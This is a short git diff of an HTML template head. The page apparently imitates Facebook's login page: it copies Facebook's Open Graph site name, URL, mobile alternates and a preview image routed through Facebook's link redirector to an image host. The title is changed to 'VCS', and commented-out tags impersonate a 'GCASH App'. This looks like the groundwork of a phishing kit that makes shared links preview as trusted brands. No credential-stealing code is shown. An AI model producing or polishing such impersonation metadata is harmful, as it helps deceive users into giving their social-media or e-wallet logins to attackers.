@@ -5,7 +5,16 @@
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <title id="pageTitle">Facebook</title>
+  <title id="pageTitle">VCS</title>
+  <meta name="google" content="notranslate" />
+  <meta property="og:site_name" content="Facebook" />
+  <meta property="og:url" content="https://www.facebook.com/" />
+  <meta property="og:image" content="https://l.facebook.com/l.php?u=https%3A%2F%2Fibb.co%2FWgxFtK9&h=AT0WH3RpU6Kci-oEObp4oQb1VXI1Jv9znWvkgh7hY09xWu41Rf02bsod3omOzU531PuoAXWiQpND-Mg8JvxeXveLaEZyo0hcty6x1EMlFP1xJcuJB2_5dWWfPb7ujR11-fxeEcT_q1zTtRo&s=1" />
+  <meta property="og:locale" content="en_US" />
+  <link rel="alternate" media="only screen and (max-width: 640px)" href="https://m.facebook.com/" />
+  <link rel="alternate" media="handheld" href="https://m.facebook.com/" />
+  <meta name="description" content="" />
+  {{-- <title id="pageTitle">Facebook</title>
   <meta name="google" content="notranslate" />
   <meta property="og:site_name" content="Facebook" />
   <meta property="og:url" content="https://www.facebook.com/" />
@@ -13,8 +22,7 @@
   <meta property="og:locale" content="en_US" />
   <link rel="alternate" media="only screen and (max-width: 640px)" href="https://m.facebook.com/" />
   <link rel="alternate" media="handheld" href="https://m.facebook.com/" />
-  <meta name="description"
-      content="Log into Facebook to start sharing and connecting with your friends, family, and people you know." />
+  <meta name="description" content="Log into Facebook to start sharing and connecting with your friends, family, and people you know." /> --}}
   {{-- <meta property="og:type" content="website">
   <meta property="og:title" content="GCASH App">
   <meta property="og:description" content="Gcash Application">
